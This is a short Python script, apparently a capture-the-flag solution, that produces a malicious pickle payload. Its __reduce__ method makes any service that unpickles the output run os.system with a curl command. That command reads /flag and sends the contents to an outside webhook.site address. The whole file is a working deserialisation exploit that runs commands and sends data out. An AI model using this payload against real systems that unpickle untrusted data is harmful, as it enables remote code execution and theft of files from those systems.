import os, pickle

class Test(object):
    def __reduce__(self):
        return (os.system,('curl https://webhook.site/5f6caa35-76f1-41a4-852b-ae88ea8ee413/?a=`cat /flag`',))
    
print(pickle.dumps(Test(), protocol=0).decode())